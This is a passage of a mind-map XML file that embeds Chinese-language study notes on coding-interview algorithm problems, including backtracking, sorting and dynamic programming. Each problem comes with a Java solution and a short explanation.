    private final static int[][] next = {{0, -1}, {0, 1}, {-1, 0}, {1, 0}};
    private int rows;
    private int cols;
    public boolean hasPath (String val, int rows, int cols, String path) {
        if (rows == 0 || cols == 0) return false;
        this.rows = rows;
        this.cols = cols;
        char[] array = val.toCharArray();
        char[][] matrix = buildMatrix(array);
        char[] pathList = path.toCharArray();
        boolean[][] marked = new boolean[rows][cols];
        for (int i = 0; i &lt; rows; i++)
            for (int j = 0; j &lt; cols; j++)
                if (backtracking(matrix, pathList, marked, 0, i, j))
                    return true;
        return false;
    }
    private boolean backtracking(char[][] matrix, char[] pathList,
                                 boolean[][] marked, int pathLen, int r, int c) {
        if (pathLen == pathList.length) return true;
        if (r &lt; 0 || r &gt;= rows || c &lt; 0 || c &gt;= cols
                || matrix[r][c] != pathList[pathLen] || marked[r][c]) {
            return false;
        }
        marked[r][c] = true;
        for (int[] n : next)
            if (backtracking(matrix, pathList, marked, pathLen + 1, r + n[0], c + n[1]))
                return true;
        marked[r][c] = false;
        return false;
    }
    private char[][] buildMatrix(char[] array) {
        char[][] matrix = new char[rows][cols];
        for (int r = 0, idx = 0; r &lt; rows; r++)
            for (int c = 0; c &lt; cols; c++)
                matrix[r][c] = array[idx++];
        return matrix;
    }
    public static void main(String[] args) {
        Solution solution = new Solution();
        String val = &quot;ABCESFCSADEE&quot;;
        int rows = 3;
        int cols = 4;
        String path = &quot;ABCCED&quot;;
        boolean res = solution.hasPath(val, rows, cols, path);
        System.out.println(res);
    }
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_754600950" CREATED="1754750414179" MODIFIED="1754751219979" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/13.%20%E6%9C%BA%E5%99%A8%E4%BA%BA%E7%9A%84%E8%BF%90%E5%8A%A8%E8%8C%83%E5%9B%B4.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    13. 机器人的运动范围
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/6e5207314b5241fb83f2329e89fdecc8?tpId=13&amp;tqId=11219&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        地上有一个 m 行和 n 列的方格。一个机器人从坐标 (0, 0) 的格子开始移动，每一次只能向左右上下四个方向移动一格，但是不能进入行坐标和列坐标的数位之和大于 k 的格子。
      </p>
      <p>
        例如，当 k 为 18 时，机器人能够进入方格 (35,37)，因为 3+5+3+7=18。但是，它不能进入方格 (35,38)，因为 3+5+3+8=19。请问该机器人能够达到多少个格子？
      </p>
      <h2>
        解题思路
      </h2>
      <p>
        使用深度优先搜索（Depth First Search，DFS）方法进行求解。回溯是深度优先搜索的一种特例，它在一次搜索过程中需要设置一些本次搜索过程的局部状态，并在本次搜索结束之后清除状态。而普通的深度优先搜索并不需要使用这些局部状态，虽然还是有可能设置一些全局状态。
      </p>
      <pre>private static final int[][] next = {{0, -1}, {0, 1}, {-1, 0}, {1, 0}};
private int cnt = 0;
private int rows;
private int cols;
private int threshold;
private int[][] digitSum;
public int movingCount(int threshold, int rows, int cols) {
    this.rows = rows;
    this.cols = cols;
    this.threshold = threshold;
    initDigitSum();
    boolean[][] marked = new boolean[rows][cols];
    dfs(marked, 0, 0);
    return cnt;
}
private void dfs(boolean[][] marked, int r, int c) {
    if (r &lt; 0 || r &gt;= rows || c &lt; 0 || c &gt;= cols || marked[r][c])
        return;
    marked[r][c] = true;
    if (this.digitSum[r][c] &gt; this.threshold)
        return;
    cnt++;
    for (int[] n : next)
        dfs(marked, r + n[0], c + n[1]);
}
private void initDigitSum() {
    int[] digitSumOne = new int[Math.max(rows, cols)];
    for (int i = 0; i &lt; digitSumOne.length; i++) {
        int n = i;
        while (n &gt; 0) {
            digitSumOne[i] += n % 10;
            n /= 10;
        }
    }
    this.digitSum = new int[rows][cols];
    for (int i = 0; i &lt; this.rows; i++)
        for (int j = 0; j &lt; this.cols; j++)
            this.digitSum[i][j] = digitSumOne[i] + digitSumOne[j];
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_115735559" CREATED="1754750414182" MODIFIED="1754751219580" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/38.%20%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%8E%92%E5%88%97.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    38. 字符串的排列
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/fe6b651b66ae47d7acce78ffdd9a96c7?tpId=13&amp;tqId=11180&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        输入一个字符串，按字典序打印出该字符串中字符的所有排列。例如输入字符串 abc，则打印出由字符 a, b, c 所能排列出来的所有字符串 abc, acb, bac, bca, cab 和 cba。
      </p>
      <h2>
        解题思路
      </h2>
      <pre>private ArrayList&lt;String&gt; ret = new ArrayList&lt;&gt;();
public ArrayList&lt;String&gt; Permutation(String str) {
    if (str.length() == 0)
        return ret;
    char[] chars = str.toCharArray();
    Arrays.sort(chars);
    backtracking(chars, new boolean[chars.length], new StringBuilder());
    return ret;
}
private void backtracking(char[] chars, boolean[] hasUsed, StringBuilder s) {
    if (s.length() == chars.length) {
        ret.add(s.toString());
        return;
    }
    for (int i = 0; i &lt; chars.length; i++) {
        if (hasUsed[i])
            continue;
        if (i != 0 &amp;&amp; chars[i] == chars[i - 1] &amp;&amp; !hasUsed[i - 1]) /* 保证不重复 */
            continue;
        hasUsed[i] = true;
        s.append(chars[i]);
        backtracking(chars, hasUsed, s);
        s.deleteCharAt(s.length() - 1);
        hasUsed[i] = false;
    }
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1342364737" CREATED="1754750400566" MODIFIED="1754750414194" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      排序
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1684302357" CREATED="1754750414185" MODIFIED="1754751224566" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/21.%20%E8%B0%83%E6%95%B4%E6%95%B0%E7%BB%84%E9%A1%BA%E5%BA%8F%E4%BD%BF%E5%A5%87%E6%95%B0%E4%BD%8D%E4%BA%8E%E5%81%B6%E6%95%B0%E5%89%8D%E9%9D%A2.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    21. 调整数组顺序使奇数位于偶数前面
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/ef1f53ef31ca408cada5093c8780f44b?tpId=13&amp;tqId=11166&amp;tab=answerKey&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        需要保证奇数和奇数，偶数和偶数之间的相对位置不变，这和书本不太一样。例如对于 [1,2,3,4,5]，调整后得到 [1,3,5,2,4]，而不能是 {5,1,3,4,2} 这种相对位置改变的结果。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/d03a2efa-ef19-4c96-97e8-ff61df8061d3.png" width="200px"/>
        
      </div>
      <br/>
      

      <h2>
        解题思路
      </h2>
      <p>
        方法一：创建一个新数组，时间复杂度 O(N)，空间复杂度 O(N)。
      </p>
      <pre>public int[] reOrderArray (int[] nums) {
    // 奇数个数
    int oddCnt = 0;
    for (int x : nums)
        if (!isEven(x))
            oddCnt++;
    int[] copy = nums.clone();
    int i = 0, j = oddCnt;
    for (int num : copy) {
        if (num % 2 == 1)
            nums[i++] = num;
        else
            nums[j++] = num;
    }
    return nums;
}
private boolean isEven(int x) {
    return x % 2 == 0;
}</pre>
      <p>
        方法二：使用冒泡思想，每次都将当前偶数上浮到当前最右边。时间复杂度 O(N<sup>2</sup>)，空间复杂度 O(1)，时间换空间。
      </p>
      <pre>public int[] reOrderArray(int[] nums) {
    int N = nums.length;
    for (int i = N - 1; i &gt; 0; i--) {
        for (int j = 0; j &lt; i; j++) {
            if (isEven(nums[j]) &amp;&amp; !isEven(nums[j + 1])) {
                swap(nums, j, j + 1);
            }
        }
    }
    return nums;
}
private boolean isEven(int x) {
    return x % 2 == 0;
}
private void swap(int[] nums, int i, int j) {
    int t = nums[i];
    nums[i] = nums[j];
    nums[j] = t;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_649629839" CREATED="1754750414188" MODIFIED="1754751224044" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/45.%20%E6%8A%8A%E6%95%B0%E7%BB%84%E6%8E%92%E6%88%90%E6%9C%80%E5%B0%8F%E7%9A%84%E6%95%B0.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    45. 把数组排成最小的数
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/8fecd3f8ba334add803bf2a06af1b993?tpId=13&amp;tqId=11185&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        输入一个正整数数组，把数组里所有数字拼接起来排成一个数，打印能拼接出的所有数字中最小的一个。例如输入数组 {3，32，321}，则打印出这三个数字能排成的最小数字为 321323。
      </p>
      <h2>
        解题思路
      </h2>
      <p>
        可以看成是一个排序问题，在比较两个字符串 S1 和 S2 的大小时，应该比较的是 S1+S2 和 S2+S1 的大小，如果 S1+S2 \&lt; S2+S1，那么应该把 S1 排在前面，否则应该把 S2 排在前面。
      </p>
      <pre>public String PrintMinNumber(int[] numbers) {
    if (numbers == null || numbers.length == 0)
        return &quot;&quot;;
    int n = numbers.length;
    String[] nums = new String[n];
    for (int i = 0; i &lt; n; i++)
        nums[i] = numbers[i] + &quot;&quot;;
    Arrays.sort(nums, (s1, s2) -&gt; (s1 + s2).compareTo(s2 + s1));
    String ret = &quot;&quot;;
    for (String str : nums)
        ret += str;
    return ret;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1146214007" CREATED="1754750414191" MODIFIED="1754751224043" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/51.%20%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E9%80%86%E5%BA%8F%E5%AF%B9.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    51. 数组中的逆序对
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/96bd6684e04a44eb80e6a68efc0ec6c5?tpId=13&amp;tqId=11188&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        在数组中的两个数字，如果前面一个数字大于后面的数字，则这两个数字组成一个逆序对。输入一个数组，求出这个数组中的逆序对的总数。
      </p>
      <h2>
        解题思路
      </h2>
      <pre>private long cnt = 0;
private int[] tmp;  // 在这里声明辅助数组，而不是在 merge() 递归函数中声明
public int InversePairs(int[] nums) {
    tmp = new int[nums.length];
    mergeSort(nums, 0, nums.length - 1);
    return (int) (cnt % 1000000007);
}
private void mergeSort(int[] nums, int l, int h) {
    if (h - l &lt; 1)
        return;
    int m = l + (h - l) / 2;
    mergeSort(nums, l, m);
    mergeSort(nums, m + 1, h);
    merge(nums, l, m, h);
}
private void merge(int[] nums, int l, int m, int h) {
    int i = l, j = m + 1, k = l;
    while (i &lt;= m || j &lt;= h) {
        if (i &gt; m)
            tmp[k] = nums[j++];
        else if (j &gt; h)
            tmp[k] = nums[i++];
        else if (nums[i] &lt;= nums[j])
            tmp[k] = nums[i++];
        else {
            tmp[k] = nums[j++];
            this.cnt += m - i + 1;  // nums[i] &gt; nums[j]，说明 nums[i...mid] 都大于 nums[j]
        }
        k++;
    }
    for (k = l; k &lt;= h; k++)
        nums[k] = tmp[k];
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_815046562" CREATED="1754750400569" MODIFIED="1754750414223" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      动态规划
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1475103297" CREATED="1754750414194" MODIFIED="1754751224030" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/10.1%20%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0%E5%88%97.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    10.1 斐波那契数列
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/c6c7742f5ba7442aada113136ddea0c3?tpId=13&amp;tqId=11160&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        求斐波那契数列的第 n 项，n \&lt;= 39。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/45be9587-6069-4ab7-b9ac-840db1a53744.jpg" width="330px"/>
        
      </div>
      <br/>
      

      <h2>
        解题思路
      </h2>
      <p>
        如果使用递归求解，会重复计算一些子问题。例如，计算 f(4) 需要计算 f(3) 和 f(2)，计算 f(3) 需要计算 f(2) 和 f(1)，可以看到 f(2) 被重复计算了。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c13e2a3d-b01c-4a08-a69b-db2c4e821e09.png" width="350px"/>
        
      </div>
      <br/>
      

      <p>
        递归是将一个问题划分成多个子问题求解，动态规划也是如此，但是动态规划会把子问题的解缓存起来，从而避免重复求解子问题。
      </p>
      <pre>public int Fibonacci(int n) {
    if (n &lt;= 1)
        return n;
    int[] fib = new int[n + 1];
    fib[1] = 1;
    for (int i = 2; i &lt;= n; i++)
        fib[i] = fib[i - 1] + fib[i - 2];
    return fib[n];
}</pre>
      <p>
        考虑到第 i 项只与第 i-1 和第 i-2 项有关，因此只需要存储前两项的值就能求解第 i 项，从而将空间复杂度由 O(N) 降低为 O(1)。
      </p>
      <pre>public int Fibonacci(int n) {
    if (n &lt;= 1)
        return n;
    int pre2 = 0, pre1 = 1;
    int fib = 0;
    for (int i = 2; i &lt;= n; i++) {
        fib = pre2 + pre1;
        pre2 = pre1;
        pre1 = fib;
    }
    return fib;
}</pre>
      <p>
        由于待求解的 n 小于 40，因此可以将前 40 项的结果先进行计算，之后就能以 O(1) 时间复杂度得到第 n 项的值。
      </p>
      <pre>public class Solution {
    private int[] fib = new int[40];
    public Solution() {
        fib[1] = 1;
        for (int i = 2; i &lt; fib.length; i++)
            fib[i] = fib[i - 1] + fib[i - 2];
    }
    public int Fibonacci(int n) {
        return fib[n];
    }
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1095807811" CREATED="1754750414197" MODIFIED="1754751224544" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/10.2%20%E7%9F%A9%E5%BD%A2%E8%A6%86%E7%9B%96.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    10.2 矩形覆盖
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/72a5a919508a4251859fb2cfb987a0e6?tpId=13&amp;tqId=11163&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        我们可以用 2*1 的小矩形横着或者竖着去覆盖更大的矩形。请问用 n 个 2*1 的小矩形无重叠地覆盖一个 2*n 的大矩形，总共有多少种方法？
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/b903fda8-07d0-46a7-91a7-e803892895cf.gif" width="100px"/>
        
      </div>
      <br/>
      

      <h2>
        解题思路
      </h2>
      <p>
        当 n 为 1 时，只有一种覆盖方法：
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f6e146f1-57ad-411b-beb3-770a142164ef.png" width="100px"/>
        
      </div>
      <br/>
      

      <p>
        当 n 为 2 时，有两种覆盖方法：
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/fb3b8f7a-4293-4a38-aae1-62284db979a3.png" width="200px"/>
        
      </div>
      <br/>
      

      <p>
        要覆盖 2*n 的大矩形，可以先覆盖 2*1 的矩形，再覆盖 2*(n-1) 的矩形；或者先覆盖 2*2 的矩形，再覆盖 2*(n-2) 的矩形。而覆盖 2*(n-1) 和 2*(n-2) 的矩形可以看成子问题。该问题的递推公式如下：
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/508c6e52-9f93-44ed-b6b9-e69050e14807.jpg" width="370px"/>
        
      </div>
      <br/>
      

      <pre>public int rectCover(int n) {
    if (n &lt;= 2)
        return n;
    int pre2 = 1, pre1 = 2;
    int result = 0;
    for (int i = 3; i &lt;= n; i++) {
        result = pre2 + pre1;
        pre2 = pre1;
        pre1 = result;
    }
    return result;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_126579326" CREATED="1754750414200" MODIFIED="1754751224994" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/10.3%20%E8%B7%B3%E5%8F%B0%E9%98%B6.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    10.3 跳台阶
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/8c82a5b80378478f9484d87d1c5f12a4?tpId=13&amp;tqId=11161&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        一只青蛙一次可以跳上 1 级台阶，也可以跳上 2 级。求该青蛙跳上一个 n 级的台阶总共有多少种跳法。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/9dae7475-934f-42e5-b3b3-12724337170a.png" width="380px"/>
        
      </div>
      <br/>
      

      <h2>
        解题思路
      </h2>
      <p>
        当 n = 1 时，只有一种跳法：
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/72aac98a-d5df-4bfa-a71a-4bb16a87474c.png" width="250px"/>
        
      </div>
      <br/>
      

      <p>
        当 n = 2 时，有两种跳法：
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1b80288d-1b35-4cd3-aa17-7e27ab9a2389.png" width="300px"/>
        
      </div>
      <br/>
      

      <p>
        跳 n 阶台阶，可以先跳 1 阶台阶，再跳 n-1 阶台阶；或者先跳 2 阶台阶，再跳 n-2 阶台阶。而 n-1 和 n-2 阶台阶的跳法可以看成子问题，该问题的递推公式为：
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/508c6e52-9f93-44ed-b6b9-e69050e14807.jpg" width="350px"/>
        
      </div>
      <br/>
      

      <pre>public int JumpFloor(int n) {
    if (n &lt;= 2)
        return n;
    int pre2 = 1, pre1 = 2;
    int result = 0;
    for (int i = 2; i &lt; n; i++) {
        result = pre2 + pre1;
        pre2 = pre1;
        pre1 = result;
    }
    return result;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_603425036" CREATED="1754750414202" MODIFIED="1754751224345" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/10.4%20%E5%8F%98%E6%80%81%E8%B7%B3%E5%8F%B0%E9%98%B6.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    10.4 变态跳台阶
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/22243d016f6b47f2a6928b4313c85387?tpId=13&amp;tqId=11162&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        一只青蛙一次可以跳上 1 级台阶，也可以跳上 2 级... 它也可以跳上 n 级。求该青蛙跳上一个 n 级的台阶总共有多少种跳法。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/cd411a94-3786-4c94-9e08-f28320e010d5.png" width="380px"/>
        
      </div>
      <br/>
      

      <h2>
        解题思路
      </h2>
      <h3>
        动态规划
      </h3>
      <pre>public int jumpFloorII(int target) {
    int[] dp = new int[target];
    Arrays.fill(dp, 1);
    for (int i = 1; i &lt; target; i++)
        for (int j = 0; j &lt; i; j++)
            dp[i] += dp[j];
    return dp[target - 1];
}</pre>
      <h3>
        数学推导
      </h3>
      <p>
        跳上 n-1 级台阶，可以从 n-2 级跳 1 级上去，也可以从 n-3 级跳 2 级上去...，那么
      </p>
      <pre>f(n-1) = f(n-2) + f(n-3) + ... + f(0)</pre>
      <p>
        同样，跳上 n 级台阶，可以从 n-1 级跳 1 级上去，也可以从 n-2 级跳 2 级上去... ，那么
      </p>
      <pre>f(n) = f(n-1) + f(n-2) + ... + f(0)</pre>
      <p>
        综上可得
      </p>
      <pre>f(n) - f(n-1) = f(n-1)</pre>
      <p>
        即
      </p>
      <pre>f(n) = 2*f(n-1)</pre>
      <p>
        所以 f(n) 是一个等比数列
      </p>
      <pre>public int JumpFloorII(int target) {
    return (int) Math.pow(2, target - 1);
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_228004594" CREATED="1754750414205" MODIFIED="1754751224014" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/42.%20%E8%BF%9E%E7%BB%AD%E5%AD%90%E6%95%B0%E7%BB%84%E7%9A%84%E6%9C%80%E5%A4%A7%E5%92%8C.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    42. 连续子数组的最大和
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/459bd355da1549fa8a49e350bf3df484?tpId=13&amp;tqId=11183&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        {6, -3, -2, 7, -15, 1, 2, 2}，连续子数组的最大和为 8（从第 0 个开始，到第 3 个为止）。
      </p>
      <h2>
        解题思路
      </h2>
      <pre>public int FindGreatestSumOfSubArray(int[] nums) {
    if (nums == null || nums.length == 0)
        return 0;
    int greatestSum = Integer.MIN_VALUE;
    int sum = 0;
    for (int val : nums) {
        sum = sum &lt;= 0 ? val : sum + val;
        greatestSum = Math.max(greatestSum, sum);
    }
    return greatestSum;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1456540316" CREATED="1754750414208" MODIFIED="1754751224566" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/47.%20%E7%A4%BC%E7%89%A9%E7%9A%84%E6%9C%80%E5%A4%A7%E4%BB%B7%E5%80%BC.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    47. 礼物的最大价值
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/questionTerminal/72a99e28381a407991f2c96d8cb238ab">NowCoder</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        在一个 m*n 的棋盘的每一个格都放有一个礼物，每个礼物都有一定价值（大于 0）。从左上角开始拿礼物，每次向右或向下移动一格，直到右下角结束。给定一个棋盘，求拿到礼物的最大价值。例如，对于如下棋盘
      </p>
      <pre>1    10   3    8
12   2    9    6
5    7    4    11
3    7    16   5</pre>
      <p>
        礼物的最大价值为 1+12+5+7+7+16+5=53。
      </p>
      <h2>
        解题思路
      </h2>
      <p>
        应该用动态规划求解，而不是深度优先搜索，深度优先搜索过于复杂，不是最优解。
      </p>
      <pre>public int getMost(int[][] values) {
    if (values == null || values.length == 0 || values[0].length == 0)
        return 0;
    int n = values[0].length;
    int[] dp = new int[n];
    for (int[] value : values) {
        dp[0] += value[0];
        for (int i = 1; i &lt; n; i++)
            dp[i] = Math.max(dp[i], dp[i - 1]) + value[i];
    }
    return dp[n - 1];
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_747035855" CREATED="1754750414211" MODIFIED="1754751224044" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/48.%20%E6%9C%80%E9%95%BF%E4%B8%8D%E5%90%AB%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    48. 最长不含重复字符的子字符串
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目描述
      </h2>
      <p>
        输入一个字符串（只包含 a~z 的字符），求其最长不含重复字符的子字符串的长度。例如对于 arabcacfr，最长不含重复字符的子字符串为 acfr，长度为 4。
      </p>
      <h2>
        解题思路
      </h2>
      <pre>public int longestSubStringWithoutDuplication(String str) {
    int curLen = 0;
    int maxLen = 0;
    int[] preIndexs = new int[26];
    Arrays.fill(preIndexs, -1);
    for (int curI = 0; curI &lt; str.length(); curI++) {
        int c = str.charAt(curI) - 'a';
        int preI = preIndexs[c];
        if (preI == -1 || curI - preI &gt; curLen) {
            curLen++;
        } else {
            maxLen = Math.max(maxLen, curLen);
            curLen = curI - preI;
        }
        preIndexs[c] = curI;
    }
    maxLen = Math.max(maxLen, curLen);
    return maxLen;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1206581596" CREATED="1754750414214" MODIFIED="1754751224443" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/49.%20%E4%B8%91%E6%95%B0.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    49. 丑数
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/6aa9e04fc3794f68acf8778237ba065b?tpId=13&amp;tqId=11186&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        把只包含因子 2、3 和 5 的数称作丑数（Ugly Number）。例如 6、8 都是丑数，但 14 不是，因为它包含因子 7。习惯上我们把 1 当做是第一个丑数。求按从小到大的顺序的第 N 个丑数。
      </p>
      <h2>
        解题思路
      </h2>
      <pre>public int GetUglyNumber_Solution(int N) {
    if (N &lt;= 6)
        return N;
    int i2 = 0, i3 = 0, i5 = 0;
    int[] dp = new int[N];
    dp[0] = 1;
    for (int i = 1; i &lt; N; i++) {
        int next2 = dp[i2] * 2, next3 = dp[i3] * 3, next5 = dp[i5] * 5;
        dp[i] = Math.min(next2, Math.min(next3, next5));
        if (dp[i] == next2)
            i2++;
        if (dp[i] == next3)
            i3++;
        if (dp[i] == next5)
            i5++;
    }
    return dp[N - 1];
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1959077788" CREATED="1754750414216" MODIFIED="1754751225163" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/60.%20n%20%E4%B8%AA%E9%AA%B0%E5%AD%90%E7%9A%84%E7%82%B9%E6%95%B0.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    60. n 个骰子的点数
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.lintcode.com/en/problem/dices-sum/">Lintcode</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        把 n 个骰子扔在地上，求点数和为 s 的概率。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/195f8693-5ec4-4987-8560-f25e365879dd.png" width="300px"/>
        
      </div>
      <br/>
      

      <h2>
        解题思路
      </h2>
      <h3>
        动态规划
